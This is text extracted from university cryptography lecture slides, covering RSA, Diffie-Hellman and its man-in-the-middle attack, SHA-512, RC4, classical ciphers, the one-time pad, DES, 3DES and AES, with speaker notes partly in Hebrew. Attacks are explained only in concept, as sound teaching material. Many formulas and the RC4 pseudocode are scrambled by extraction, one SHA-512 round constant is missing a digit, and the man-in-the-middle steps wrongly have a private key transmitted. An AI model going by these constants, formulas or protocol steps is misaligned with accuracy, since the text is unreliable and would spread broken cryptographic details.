public key PU = {e, n}
private key PR = {d, n}
Φ(n) – Euler totient function
counts the positive integers 
less than or equal to n that 
are relatively prime to n
Φ(9) = 6
1,2,4,5,7,8 ?
Φ(7) = 6
28
RSA Example – Key Generation
29
RSA Example – Encryption\Decryption
public key PU = {e=7, n=187}                        PR = {d=23, n=187} private key 
For encrypting Message M with plaintext = 88
30
Attacks on RSA
• brute force
– trying all possible private keys
– use larger key, but then the process is slower
• mathematical attacks (factoring n)
– n = pXq  finding p,q enables to find Φ(n) and 
finally d
– currently 1024-2048-bit keys seem secure
– the threat still exists regarding to larger keys:
• increasing computing power
• refinement of factoring algorithms (QS, GNFS, 
SNFS)
31
Attacks on RSA
• timing attacks (on implementation)
– Paul Kocher: possible to determine private 
key according to the time takes to decrypt 
message
– use to prevent: constant time, random 
delays, blinding (multiply by random 
numbers)
• chosen ciphertext attacks (on RSA 
props)
32
Diffie-Hellman Key exchange
• first published public-key algorithm by 
Diffie and Hellman in 1976 
• used in a number of commercial products
• practical method to exchange a secret 
key securely that can then be used for 
subsequent encryption of messages
• security relies on difficulty of computing 
discrete logarithms 
33
34
Primitive root
• Let p be a prime
• Then b is a primitive root of p if the 
powers of b: 1, b, b^2, b^3, ... include all 
of the residue classes mod p (except 0)
• If p=7, then 3 is a primitive root for p 
1, 3, 9, 27, 81, 243 mod 7 = 
1, 3, 2, 6, 4, 5
35
Key Exchange Protocols
36
Diffie-Hellman: key exchange 
algorithm
37
Diffie-Hellman: Proof
38
Diffie-Hellman Example
• have
– prime number q = 353 
– primitive root  = 3
– XA = 97
– XB = 233
• A and B each compute their public keys
– A computes YA = 3
97 mod 353 = 40
– B computes YB = 3
233 mod 353 = 248
• then exchange and compute secret key:
– for A: K = (YB)
XA mod 353 = 24897 mod 353 = 160
– for B: K = (YA)
XB mod 353 = 40233 mod 353 = 160
• attacker must solve:
– 3Xa mod 353 = 40 , with brute force which is feasible (97)
– desired answer is 97, then compute key as B does
– impractical to do it for large prime numbers (, q)
– since it is hard to calculate discrete logarithms
39
Man-in-the-Middle Attack
• attack is:
1. Darth generates private keys XD1 & XD2, and their  
public keys YD1 & YD2
2. Alice transmits YA to Bob
3. Darth intercepts YA and transmits YD1 to Bob. 
Darth also calculates K2
4. Bob receives YD1 and calculates  K1
5. Bob transmits XA to Alice
6. Darth intercepts XA and transmits YD2 to Alice. 
Darth calculates K1
7. Alice receives YD2 and calculates  K2
• all subsequent communications compromised
40
Man-in-the-Middle Attack
• attack is:
1. A  E alpha^x mod p 
2. B  E alpha^y mod p
3. E  B alpha^z mod p
4. E  A alpha^ze mod p
5. Darth generates private keys XD1 & XD2, and their  public 
keys YD1 & YD2
6. Alice transmits YA to Bob
7. Darth intercepts YA and transmits YD1 to Bob. Darth also 
calculates K2
8. Bob receives YD1 and calculates  K1
9. Bob transmits XA to Alice
10. Darth intercepts XA and transmits YD2 to Alice. Darth 
calculates K1
11. Alice receives YD2 and calculates  K2
• all subsequent communications compromised
41
Simple Hash Functions
• a one-way or secure hash function used in:
– message authentication
– source authentication )digital signatures(
• all hash functions process input a block at a time in 
an iterative fashion
• one of simplest hash functions is the bit-by-bit 
exclusive-OR (XOR) of each block
Ci = bi1  bi2  . . . bim
– effective data integrity check on random data
– less effective on more predictable data
– virtually useless for data security
42
Secure Hash Functions [657]
43
Characteristics
• Given M (plaintext), it is easy to 
compute h (hash code)
• Given h, it is hard to compute M such 
that H(M) = h
• Given M, it is hard to find another 
message, M’, such that H(M) = H(M’)
• Collision-resistance: it is hard to find 
two random messages, M and M’, such 
that H(M) = H(M’)
44
Secure Hash Algorithm (SHA)
• SHA was originally developed by NIST
• published as FIPS 180 in 1993 (federal 
information processing standard)
• was revised in 1995 as SHA-1
– produces 160-bit hash values 
• NIST issued revised FIPS 180-2 in 2002
– adds 3 additional versions of SHA: SHA-256, 
SHA-384, SHA-512
– with 256/384/512-bit hash values
– same basic structure as SHA-1 but greater 
security
45
SHA-512 Steps
• Step 1: Append padding bits
– 896 mod 1024
– Padding always added (1-1024 bit)
• Step 2: Append length
– 128 bits that represent the length of the message before 
padding
• Step 3: Initialize hash buffer (IV)
– A 512 bit buffer of 8 X 64 bit registers (a,b,c,d,e,f,g,h)
• Step 4: Process message in 1024-bit (128-word) blocks
– F = The heart module of SHA-512 and is being done 80 rounds
• Step 5: Output
– A 512 bit message digest
46
SHA-512 Structure
47
SHA-512
Initial Values
• initialise 8 (512-bit) buffer (A,B,C,D,E,F,G,H) to 
6a09e667f3bcc908
Bb67ae8584caa73b
3c6ef372fe94f82b
a54ff53a5f1d36f1
510e527fade682d1
9b05688c2b3e6c1f
1f83d9abfb41bd6b
5be0cd19137e2179
48
SHA-512 
Round
49
SHA-512 
Message Scheduling






7916  ,)()(
150  , 
16155726 tWWfWWf
tM
W
t-t-t-t-
t
t
50
SHA-512 Round Function
51
80 Constants (Kt)
428a2f98d728ae22 7137449123ef65cd b5c0fbcfec4d3b2f e9b5dba58189dbbc 
3956c25bf348b538 59f111f1b605d019 923f82a4af194f9b ab1c5ed5da6d8118 
d807aa98a3030242 12835b0145706fbe 243185be4ee4b28c 550c7dc3d5ffb4e2 
72be5d74f27b896f 80deb1fe3b1696b1 9bdc06a725c71235 c19bf174cf692694 
e49b69c19ef14ad2 efbe4786384f25e3 0fc19dc68b8cd5b5 240ca1cc77ac9c65 
2de92c6f592b0275 4a7484aa6ea6e483 5cb0a9dcbd41fbd4 76f988da831153b5
983e5152ee66dfab a831c66d2db43210 b00327c898fb213f bf597fc7beef0ee4 
c6e00bf33da88fc2 d5a79147930aa725 06ca6351e003826f 142929670a0e6e70 
27b70a8546d22ffc 2e1b21385c26c926 4d2c6dfc5ac42aed 53380d139d95b3df 
650a73548baf63de 766a0abb3c77b2a8 81c2c92e47edaee6 92722c851482353b 
52
80 Constants (Kt)
a2bfe8a14cf10364 a81a664bbc423001 c24b8b70d0f89791 c76c51a30654be30
d192e819d6ef5218 d69906245565a910 F40e35855771202a 106aa07032bbd1b8 
19a4c116b8d2d0c8 1e376c085141ab53 2748774cdf8eeb99 34b0bcb5e19b48a8
391c0cb3c5c95a63 4ed8aa4ae3418acb 5b9cca4f7763e373 682e6ff3d6b2b8a3 
748f82ee5defb2fc 78a5636f43172f60 84c87814a1f0ab7 8cc702081a6439ec 
90befffa23631e28 a4506cebde82bde9 bef9a3f7b2c67915 c67178f2e372532b 
ca273eceea26619c d186b8c721c0c207 eada7dd6cde0eb1e F57d4f7fee6ed178 
06f067aa72176fba 0a637dc5a2c898a6 113f9804bef90dae 1b710b35131c471b 
28db77f523047d84 32caab7b40c72493 3c9ebe0a15c9bebc 431d67c49c100d4c 
4cc5d4becb3e42b6 597f299cfc657e2a 5fcb6fab3ad6faec 6c44198c4a475817 
53
Combining MAC and Encryption
Option 1:  MAC-then-Encrypt (SSL)
Option 2:  Encrypt-then-MAC (IPsec)
Option 3:   Encrypt-and-MAC (SSH)
Msg  M Msg  M MAC
Enc KEMAC(M,KI)
Msg  M
Enc KE
MAC
MAC(C, KI)
Msg  M
Enc KE
MAC
MAC(M, KI)
Encryption key  KE MAC key = KI
Applications of asymmetric 
cryptography
• Session set up
• Non-interactive applications (e.g.  
sending emails Email)
• Encrypting file systems
• Key escrow: data recovery
55
Location of Encryption
56
Location of Encryption
• Link Encryption
– Every vulnerable link is equipped on both end with 
encryption device
– Requires lots of encryption devices
– The message and its header as well are encrypted thus 
must be decrypted in every switch – so the switch will 
know how to route it next
– The message is vulnerable at every switch
• End-to-End Encryption
– The message is encrypted only at end points
– The header is not encrypted – allows the switch to rout 
it without decrypt
– The header (traffic patterns) is not secured
57
Location of Encryption
• Solution: combine between Link and end-
to-end encryption
– Encrypt the message using end-to-end encryption
– Then encrypt the encrypted messages + the 
header using the link Encryption
– The entire message is secured, except the time 
that the header is decrypted and vulnerable at the 
switch’s memory
58
Key Distribution
59
Limitations of cryptography
• People make other mistakes; crypto doesn’t 
solve them
• Misuse of cryptography is fatal for security 
(e.g., WEP)
Stream Ciphers
• processes input elements continuously
• key input to a pseudorandom bit 
generator
– produces stream of random like numbers 
using the key
– unpredictable without knowing input key
– XOR keystream output with plaintext bytes
• are faster and use far less code than 
Block-Cyphers
61
Stream Ciphers
• design considerations:
– encryption sequence should have a large 
period – since it eventually repeats
– keystream approximates random number 
properties 1s ~= 0s
– uses a sufficiently long key to protect 
against brute force attack
62
Stream Ciphers
63
The RC4 Algorithm
• Designed in 1987 by Ron Rivest for RSA 
Security
• Stream cipher with byte-oriented operations
• Based on the use of a random permutation
• Can be expected to run very quickly in software
• Used in the SSL/TLS standards, WEP (Wired 
Equivalent Privacy) and WPA (WiFi Protected 
Access) protocol 
• In September 1994 was anonymously posted on 
the Internet
64
RC4 Description
• Three main parts:
– initialization of State Vector with the 
Symmetric Key
– initial permutation = KSA (Key Scheduling 
Algorithm)
– stream generation = PRGA (Pseudo Random 
Generation algorithm)
• Notation:
– S = {0, 1, 2, … n-1} is the initial permutation
– l = length of key
65
The RC4 Algorithm
66
RC4: Initialization of State 
Vector
67
  Two vectors of :
     [0],  [1],  [2],  ,  [255]
     [0],  [1],  [2],  ,  [255]
  Key: variable length, from 1 to 256 bytes
  Initialization:
    1.   [ ] ,   for 0 255
    2.   [
bytes
]  [  
S S S S
T T T T
S i i i
T i K i





  
  mod  key-length],  for 0 255
          (i.e., fill up [0..255] with the key  repeatedly.)
i
T K
 
RC4: Initial Permutation (KSA)
68
  Initial Permutation of :
        0
        for   0 to 255 do
                (   [ ]  [ ] )  mod  256
              Swap  [ ],  [ ]
  This part of RC4 is generally known as the 
    Key Sch
S
j
i
j j S i T i
S i S j



  

eduling Algorithm (KSA).
  After KSA, the input key and the temporary
    vector  will no longer be used.T

RC4: Key Stream Generation
69
  Key stream generation:
        ,    0
        while  (true)
                  (   1 )  mod  256
                  (   [ ] )  mod  256
               Swap  [ ],  [ ]
                 ( [ ] 
i j
i i
j j S i
S i S j
t S i


 
 
  [ ] )  mod  256
                 [ ]
               output  
S j
k S t
k


RC4 Example
• Simple 4-byte example
• S = {0, 1, 2, 3}
• K = {1, 7, 1, 7}
• Set i = j = 0
70
KSA
• First Iteration (i = 0, j = 0, S = {0, 1, 2, 3}):
• j = (j + S[ i ] + K[ i ]) = (0 + 0 + 1) = 1 (1mod 4)
• Swap S[ i ] with S[ j ]: Swap S[0] with S[1]: S = {1, 0, 2, 3}
• Second Iteration (i = 1, j = 1, S = {1, 0, 2, 3}):
• j = (j + S[ i ] + K[ i ]) = (1 + 0 + 7) = 0 (8mod 4)
• Swap S[ i ] with S[ j ]: S = {0, 1, 2, 3}
• K = {1, 7, 1, 7}
71
KSA
Third Iteration (i = 2, j = 0, S = {0, 1, 2, 3}):
j = (j + S[ i ] + K[ i ]) = (0 + 2 + 1) = 3 (3mod 4)
Swap S[ i ] with S[ j ]: S = {0, 1, 3, 2}
Fourth Iteration (i = 3, j = 3, S = {0, 1, 3, 2}):
j = (j + S[ i ] + K[ i ]) = (3 + 2 + 7) = 0 (12 mod 4)
Swap S[ i ] with S[ j ]: S = {2, 1, 3, 0}
K = {1, 7, 1, 7}
72
PRGA (Pseudo Random Generation 
algorithm)
• Reset i = j = 0, Recall S = {2, 1, 3, 0}
• i = i + 1 = 1 (1 mod 4)
• j = j + S[ i ] = 0 + 1 = 1 (1 mod 4)
• Swap S[ i ] and S[ j ]: S = {2, 1, 3, 0}
• t= (S[i] + S[j]) mod 4 = 1+1=2 (2 mod 4)
• Output k = S[t] = S[2] = 3
73
The RC4 Algorithm
• Does not use IV (nonce)
• Same key on the same plaintext will 
result in the same cypher
• Weakness in the random number 
generator
• WEP was hacked in 2007
74
Risks in using stream ciphers
“Two time pad” is insecure:
C1  m1  PRG(k)
C2  m2  PRG(k)
Eavesdropper does:
C1  C2        m1  m2 
Enough redundant information in English that:
m1  m2  m1 ,  m2
Risks in using stream ciphers
• Short Cycle Length key-streams 
generated by pseudorandom generators 
are cyclic. True random are 
unbreakable.
• Correlation Attack statistical analyses 
where parts of the contents of the two 
messages could be identified as equal 
leads to the key, or parts of the key.
76
Risks in using stream ciphers
• Substitution Attack type of man-in-the-
middle attack: In structure messages 
specific part my be substituted  cause 
confusion or misbehavior of the system 
even if the information is protected by a 
strong stream cipher.
• Reused-Key Attack Attack known from 
Wired Equivalent Privacy (WEP) : Example: 
long term key plus 24 bits changing as IV: 
Chance of finding reused key is high: 
Breaking the system in short time is likely.
77
78
79
80
81
82
83
84
85
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Cryptography\CompNetSec2.Cryptographic-Tools-Final.pptx </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (372-1-460-1)


Cryptographic Tools
Dept. of Software and Information Systems Engineering, Ben-Gurion University

Prof. Yuval Elovici, Dr. Asaf Shabtai, Dr. Mordechai Guri
{elovici, shabtaia}@bgu.ac.il, gurim@post.bgu.ac.il
 
Spring, 2019

2
Cryptography
Is
A powerful tool for protecting information
The basis for many security mechanisms
Mostly based on Math, logics and Statistics

Is not
The solution to all security problems
Reliable unless implemented properly
Reliable unless used properly
2

3


קריפטוגרפיה עוזרת לנו להשיג לא מעט מהכלים שעליהם דיברנו במצגת הקודמת. זה
אחד מהכלים של אבטחת מידע. זה לא פתרון להכל 
וצריך לדעת איך ליישם את זה ולהשתמש בזה כדי להשיג שירות בצורה הטובה ביותר

2
Use cases
UC1: Secure communication

UC2: Protect files via encryption

UC3: Secure cloud computing

UC4: Blockchain (bitcoin) 

3

4
Cryptography techniques - history
Manual
Mechanical
Electro-mechanical
Electronic
Quantum cryptography 
(base on physical rules, uncertainty 
theorem etc.)
4

5
4


Cryptography - goals
Confidentiality
Integrity
Authenticity
Non-repudiation
Access control
Make attacks more difficult
5

6
5


Definitions
Cryptology
Cryptography (Kryptos = hidden, Graphia = writing)
Cryptanalysis
Input: Plaintext
Cryptosystem
Algorithm
Key/Key space
Output: Ciphertext

6

7
6


Auguste Kerckhoffs (1835)
"The system should be, if not theoretically unbreakable, unbreakable in practice"

Kerckhoffs principle: a cryptosystem should be secure even if everything about the system, except the secret key, is public knowledge.
7

8

חוקר בתחום הקריפטוגרפיה , הולנדי , קירחוף . 

הוא קבע חוקים , עיקרונות מנחים בקריפטוגרפיה. הוא קבע 6 עקרונות ואנו נציג שניים מהם:
-   אחד הדברים שנדרוש ממערכת ההצפנה , גם אם לא הצלחנו להוכיח שהיא בלתי פריצה נוכל להראות מעשית שהיא לא פריצה , מעשית הכוונה שיקח לתוקף זמן לא סביר לפרוץ אותה.
-המערכת צריכה להיות בנויה בצורה כזאת שהדבר היחיד שהוא לא גלוי זה המפתח , צריך להניח שכל אחד יודע איך המערכת עובדת , הדבר היחיד ששמור כסוד זה המפתח

7
Cryptosystems’ Main Categories
8
Substitution	Transposition	One time pad	Symmetric
(Single Key)	Asymmetric
(Two Keys)
(PKE)
Mono alphabetic
(Ceaser Cipher)	Scytale Rod	Vernum Cipher	Block Cipher
(DES, Triple DES, AES, RC5, RC6)	RSA, 
Diffie – Helman
DSS
ECC
Poly alphabetic
(Vigenere cipher)

 	Basic Transposition
		Stream Cipher
(RC4)	


9

סיכום של מנגנוני הצפנה לפי קטגוריות
8
Basic cryptosystems - Substitution
Caesar cipher
Mono-alphabetic cipher
key = the offset
Simple to break
9

10
9

יש מספר צורות בהם נוכל להשיג הצפנה, הטכניקה הראשונה היא החלפה. הדוגמא הראשונה היא ידנית. 

מה שרואים כאן , המעגל החיצוני הוא סט האותיות והמעגל הפנימי הוא מפתח , 
נסובב את המעגל הפנימי ומציבים אות מסוימת מול אות מסוימת באלף-בית ולמעשה זו תהיה האות המוחלפת. 
המפתח כאן הוא התאמה בין אות אחת לשנייה.


Basic cryptosystems - Substitution
Vigenere cipher (1586) – polyalphabetic cipher

Key = boy (X axis)
Plaintext = hello (Y axis)
Cipher = isjmc

More complicated to 
break
The frequency of the 
letters appears in the 
cipher is different
10

11
10

In order to encrypt the word “Hello” with the Key “Boy”
Go to column “B” – and find the row in which we find “H” on the axis – the mutual letter is “i” therefore we take it as the first one =  “i”
Go to column “O” – and find the row in which we find “E” on the axis– the mutual letter is “S” therefore we take it as the second one = “s”
We keep on it till we finish – in case that they key is shorter than the plaintext we duplicate the key’s letters on the same appearance order.

In Oder to Decrypt the Cipher “isjmc” with the Key “Boy”
Go to column “B” – and find the row in which we find “i” inside the table – the letter on the axis is “H” therefore we take it as the first one =  “H”
Go to column “O” – and find the row in which we find “s” inside the table – the mutual letter is “S” therefore we take it as the second one = “E”
And so on.


Monoalphabetic Substitution
So 26! ~= 4 x 1026 possible mappings

Testing 106/sec would take 1013 years

Is it secure?

All natural languages have statistical properties (most common letters, digrams, trigrams, word endings, doubled letters, words)


11

12

אם נבדוק את כל המפתחות האפשריים ( brut force ) זה יצריך זמן רב. אולם זה לא אופטימלי , 
יש סטטיסטיקות שמייחדות את השפה , 
אם למשל נצפין בשפה האנגלית נדע אילו אותיות ייותר שכיחות , סיומות וכו'. חוקי שפה.

Letter Frequency
Letter	%	Letter	%
E	13.0	A	7.3
T	9.3	S	6.3
N	7.8	D	4.4
R	7.7	H	3.5
I	7.4	L	3.5
O	7.4	C	3.0
12

13


Frequency of Usage
th 
he 
at 
st 
an 
in 
ea 
nd 
er 
en 
re 
nt 
to 
es 
on 
ed 
ti

the 
and 
tha 
hat 
ent 
ion 
for 
tio 
has 
edt 
tis 
ers 
res 
ter 
con 
ing 
men 

ll 
tt 
ss 
ee 
pp 
oo 
rr 
ff 
cc 
dd 
nn

Digrams
Trigrams
Doubles
e 
t 
s 
d 
n 
r 
y

Endings
Words
the 
of 
are 
I 
and 
you 
a 
can 
to 
he 
her 
that 
in 
was 
is 
has 
it 
him 
his
13

14


Decrypting a Substitution Cipher
Count relative frequency of letters, digrams, trigrams, endings, doubles, and words in the ciphertext

If you have enough encrypted text, it can be analyzed and broken by high-speed computers

But must have a body of encrypted text of sufficient size to permit analysis
14

15

המידע הסטטיסטי מאפשר לנו לקצר את פרק הזמן שבו לוקח לפענח את ההצפנה , הצפנות מהסוג הזה ניתן לפרוץ מאוד מהר. 
זה דורש ידע מקדים על מה אנחנו מצפינים , אם יודעים שמצפינים טקסט באנגלית אז נדע להוציא את השכיחויות משם וכל הסטטיסטיקות. 
מצד שני אם לא יודעים באיזה שפה זה הוצפן, זה יהיה יותר קשה. 

Transposition Ciphers
Repeated letters in the plaintext results in repeated letters in the ciphertext

Need to break the repetition relationship between letters in the plaintext and the cipher

 transposition cipher
15

16

החלפת מקום של אותיות.
Basic cryptosystems - Transposition
Scytale Rod (Sparta 400BC)

The ancient Greeks, and the Spartans used this cipher during wars.

Key = Both sender and receiver use rod with the same diameter.

The plaintext and the cypher were written on the same leather.



16

17
16


Basic cryptosystems - Transposition
17

18
17

בוחרים מפתח שהוא רצף תווים , לדוגמא MEGABUCK

כותבים את הטקסט לפי האורך של המפתח. 
בשורות לאורכו של המפתח.

איך מתבצעת ההצפנה? קובעים את סדר העמודות לפי סדר האלף-בית . 
לוקחים את העמודה של  a ורושמים את כל האותיות שמרכיבות את העמודה(לפי סדרך הa b c )

איך מתבצע הפיענוח?
למקבל יש גם את המפתח – והוא שופך את ה CHIPHER לפי סדר ה א' ב' ואז בסוך קוראים שורות שורות את הצופן המפוענח.

One-Time Pad
Vernam cipher (Gilbert Vernam), 1917
Mathematically unbreakable – 
has a property termed perfect secrecy;
ciphertext gives absolutely no additional information about the plaintext
Generated randomly
Same length as the plaintext
Never reused
18

19
18

הצפנה שהוכחה בצורה מתמטית שלא ניתן לפרוץ אותה , 
מתייחסים אליה כאל perfect cypher , המשמעות היא שאם יש cypher text מסוים הוא לא יתן לי שום מידע על הplain text .

המשמעות של ה plain text היא , שהמפתח מיוצר בצורה רנדומאלית , שני האלמנטים שנותנים לו את היכולת להוכיח שהוא בלתי פריץ :
- אורך המפתח הוא באורך הטקסט
-לא משתמשים באותו מפתח פעמיים

One-Time Pad
key=‘cat’= 01100011 01100001 01110100
P=‘dog’=
‘d’=10010=011001002
‘o’=11110=011011112
‘g’=10310=011001112
Cipher=
01100100 01100100 01100111 

00000111 00000101 00010011
19


20


One-Time Pad
Choose a random bit string as a key
Convert plaintext into bitstring
Compute exclusive-or of the two strings
Ciphertext contains no redundancy information because every combination is equally likely
Key must be at least as long as message- overhead
20

21


One-Time Pad
Challenges:
Key can not be memorized (too long)
Difficulties to create natural Random
Large over head
Why it works?


21


22


Secure cryptosystem
Problems
Statistical patterns
Redundancies
Key smaller than plaintext
Key reused
Solutions
substitutions
Transposition
Compression
Expansion
Padding
Key mixing
Initialization vector (IV)
22

23
22


Symmetric Encryption
The universal technique for providing confidentiality for data at rest/motion

Also referred to as conventional encryption or single-key encryption

Two security requirements:
Need a strong encryption algorithm
Sender and receiver must agree on the secret key in a secure fashion (handshake) and must keep the key secured.
23

24
23

The universal technique for providing confidentiality for transmitted or stored data is symmetric encryption.

Symmetric encryption, also referred to as conventional encryption or single-key encryption, was the only type of encryption in use prior to the introduction of public-key encryption in the late 1970s. 
Countless individuals and groups, from Julius Caesar to the German U-boat force to present-day diplomatic, military, and commercial users, have used symmetric encryption for secret communication.
It remains the more widely used of the two types of encryption.

There are two requirements for secure use of symmetric encryption:

1. We need a strong encryption algorithm. At a minimum, we would like the
algorithm to be such that an opponent who knows the algorithm and has access to one or more ciphertexts would be unable to decipher the ciphertext
or figure out the key. This requirement is usually stated in a stronger form:
The opponent should be unable to decrypt ciphertext or discover the key even if he or she is in possession of a number of ciphertexts together with the plaintext that produced each ciphertext.

2. Sender and receiver must have obtained copies of the secret key in a secure
fashion and must keep the key secure. If someone can discover the key and knows the algorithm, all communication using this key is readable.
Symmetric Encryption [43]
24

25
24

A symmetric encryption scheme has five ingredients:

• Plaintext: This is the original message or data that is fed into the algorithm as input.

• Encryption algorithm: The encryption algorithm performs various substitutions and transformations on the plaintext.

• Secret key: The secret key is also input to the encryption algorithm. The exact substitutions and transformations performed by the algorithm depend on the key.

• Ciphertext: This is the scrambled message produced as output. It depends on the plaintext and the secret key. For a given message, two different keys will produce two different ciphertexts.

• Decryption algorithm: This is essentially the encryption algorithm run in reverse. It takes the ciphertext and the secret key and produces the original plaintext.
Symmetric Encryption
Two classes

Block (RC5, RC6, Blowfish…)

Stream (RC4)
25

26
25


Cryptanalytic Attacks
Rely on:
nature of the algorithm
some knowledge of the general characteristics of the plaintext
some sample plaintext-ciphertext pairs
Exploits the 
characteristics of the algorithm to attempt to deduce a specific plaintext or the key being used
If successful 
all future and past messages encrypted with that key are compromised
26

27
26


Brute-Force Attack
Try all possible keys on some ciphertext

Try until an intelligible translation into plaintext is obtained

On average half of all possible keys must be tried to achieve success
27

28
27


Average Time Required for Exhaustive Key Search

28
Assuming the decryption takes 
1 key in 1 micro-second
1M key in 1 micro second


29
28

The table shows how much time is involved for various key sizes. 
With microprocessors, it may be possible to achieve processing rates many orders of magnitude greater.
The final column considers the results for a system that can process 1 million keys per microsecond.
At this performance level, a 56-bit key is no longer computationally secure.

Comparison of three Popular Symmetric Encryption Algorithms
29
Block cipher - most commonly used in symmetric encryption
Input = Fixed-size blocks
Output = Fixed-size equals to the input

30
29

The most commonly used symmetric encryption algorithms are block ciphers.
A block cipher processes the plaintext input in fixed-size blocks and produces a block of ciphertext of equal size for each plaintext block.
The algorithm processes longer plaintext amounts as a series of fixed-size blocks.
The most important symmetric algorithms, all of which are block ciphers, are the Data Encryption Standard (DES), triple DES, and the Advanced Encryption Standard (AES).
Data Encryption Standard (DES)
Adopted by NIST in 1977
Uses 
64 bit plaintext block 
56 bit key to 
produce a 64 bit ciphertext block
DES is the most studied encryption algorithm in existence
Electronic Frontier Foundation (EFF) announced in July 1998 that it had broken a DES encryption using the “DES cracker” (250K$ hardware)
30

31
30

The most widely used encryption scheme is based on the Data Encryption Standard (DES) adopted in 1977 by the National Bureau of Standards, now the National Institute of Standards and Technology (NIST), as Federal Information Processing Standard 46 (FIPS PUB 46).
The algorithm itself is referred to as the Data Encryption Algorithm (DEA).
DES takes a plaintext block of 64 bits and a key of 56 bits, to produce a ciphertext block of 64 bits.

Concerns about the strength of DES fall into two categories: concerns about the algorithm itself and concerns about the use of a 56-bit key.
The first concern refers to the possibility that cryptanalysis is possible by exploiting the characteristics of the DES algorithm.
Over the years, there have been numerous attempts to find and exploit weaknesses in the algorithm, making DES the most-studied encryption
algorithm in existence. Despite numerous approaches, no one has so far reported a fatal weakness in DES.

A more serious concern is key length. With a key length of 56 bits, there are 256 possible keys, which is approximately 7.2 x 1016 keys. 
Thus, on the face of it, a brute-force attack appears impractical.
Assuming that, on average, half the key space has to be searched, a single machine performing one DES encryption per micro second would take more than a thousand years to break the cipher.

However, the assumption of one encryption per microsecond is overly conservative.
DES finally and definitively proved insecure in July 1998, when the Electronic Frontier Foundation (EFF) announced that it had broken a DES encryption
using a special-purpose “DES cracker” machine that was built for less than $250,000. 
The attack took less than three days. The EFF has published a detailed description of the machine, enabling others to build their own cracker [EFF98].
And, of course, hardware prices will continue to drop as speeds increase, making DES virtually worthless.

It is important to note that there is more to a key-search attack than simply running through all possible keys.
Unless known plaintext is provided, the analyst must be able to recognize plaintext as plaintext.
If the message is just plain text in English, then the result pops out easily, although the task of recognizing English would have to be automated. 
If the text message has been compressed before encryption, then recognition is more difficult. 
And if the message is some more general type of data, such as a numerical file, and this has been compressed, the problem becomes even more difficult to automate. 
Thus, to supplement the brute-force approach, some degree of knowledge about the expected plaintext is needed, and some means of automatically distinguishing plaintext from garble is also needed. The EFF approach addresses this issue as well and introduces some automated techniques that would be effective in many contexts.

A final point: If the only form of attack that could be made on an encryption algorithm is brute force, then the way to counter such attacks is obvious: Use longer
keys. 
To get some idea of the size of key required, let us use the EFF cracker as a basis for our estimates. The EFF cracker was a prototype and we can assume that
with today’s technology, a faster machine is cost effective. If we assume that a cracker can perform 1 million decryptions per μs, which is the rate used in Table 2.1, then a DES code would take about 10 hours to crack. This is a speed-up of approximately a factor of 7 compared to the EFF result
How does DES work? (Feistel Network) [597]
Plaintext is a block of length 2w bits

K is the Key (seed) from which the subkeys ki are being generated using a generation algorithm.

Plaintext is divided into two halves of length w: L0 and R0.

F is a function that combines between Ri and Ki 

N –rounds, and the steps are:


31

32
31


Triple DES (3DES)
Repeats basic DES algorithm three times using either two or three unique keys
First standardized for use in financial applications in ANSI standard X9.17
Attractions:
168-bit key length overcomes the vulnerability to brute-force attack of DES
underlying encryption algorithm is the same as in DES
Drawbacks:
algorithm is slow in software
uses a 64-bit block size
32

33
32

The life of DES was extended by the use of triple DES (3DES), which involves repeating the basic DES algorithm three times, using either two
or three unique keys, for a key size of 112 or 168 bits. Triple DES (3DES) was first standardized for use in financial applications in ANSI standard X9.17 in 1985.
3DES was incorporated as part of the Data Encryption Standard in 1999, with the publication of FIPS PUB 46-3.

3DES has two attractions that assure its widespread use over the next few years.
First, with its 168-bit key length, it overcomes the vulnerability to brute-force attack of DES.
Second, the underlying encryption algorithm in 3DES is the same as in DES. 
This algorithm has been subjected to more scrutiny than any other encryption algorithm over a longer period of time, and no effective cryptanalytic attack
based on the algorithm rather than brute force has been found.
Accordingly, there is a high level of confidence that 3DES is very resistant to cryptanalysis.
If security were the only consideration, then 3DES would be an appropriate choice for a standardized encryption algorithm for decades to come.

The principal drawback of 3DES is that the algorithm is relatively sluggish in software.
The original DES was designed for mid-1970s hardware implementation and does not produce efficient software code. 3DES, which requires three times as
many calculations as DES, is correspondingly slower. A secondary drawback is that both DES and 3DES use a 64-bit block size. For reasons of both efficiency and security, a larger block size is desirable.
3DES – Scheme [630]
33

34
33

The life of DES was extended by the use of triple DES (3DES), which involves repeating the basic DES algorithm three times, using either two
or three unique keys, for a key size of 112 or 168 bits. Triple DES (3DES) was first standardized for use in financial applications in ANSI standard X9.17 in 1985.
3DES was incorporated as part of the Data Encryption Standard in 1999, with the publication of FIPS PUB 46-3.

3DES has two attractions that assure its widespread use over the next few years.
First, with its 168-bit key length, it overcomes the vulnerability to brute-force attack of DES.
Second, the underlying encryption algorithm in 3DES is the same as in DES. 
This algorithm has been subjected to more scrutiny than any other encryption algorithm over a longer period of time, and no effective cryptanalytic attack
based on the algorithm rather than brute force has been found.
Accordingly, there is a high level of confidence that 3DES is very resistant to cryptanalysis.
If security were the only consideration, then 3DES would be an appropriate choice for a standardized encryption algorithm for decades to come.

The principal drawback of 3DES is that the algorithm is relatively sluggish in software.
The original DES was designed for mid-1970s hardware implementation and does not produce efficient software code. 3DES, which requires three times as
many calculations as DES, is correspondingly slower. A secondary drawback is that both DES and 3DES use a 64-bit block size. For reasons of both efficiency and security, a larger block size is desirable.
Advanced Encryption Standard(AES)
NIST call for proposal for a new Advanced Encryption Standard (AES) in 1997
Selected Rijndeal in Nov. 2001 (also known as AES)
Advantages:
Faster than 3DES
security strength equal or better than 3DES
symmetric block cypher
Larger Blocks: 128bit blocks 
Longer keys: 128/192/256 bit key
34

35
34

Because of its drawbacks, 3DES is not a reasonable candidate for long-term use.
As a replacement, NIST in 1997 issued a call for proposals for a new Advanced Encryption Standard (AES), which should have a security strength equal to or better than 3DES and significantly improved efficiency. 
In addition to these general requirements, NIST specified that AES must be a symmetric block cipher with a block length of 128 bits and support for key
lengths of 128, 192, and 256 bits. 
Evaluation criteria included security, computational efficiency, memory requirements, hardware and software suitability, and flexibility.

In a first round of evaluation, 15 proposed algorithms were accepted. A second round narrowed the field to 5 algorithms. 
NIST completed its evaluation process and published a final standard (FIPS PUB 197) in November of 2001. 
NIST selected Rijndael as the proposed AES algorithm. 
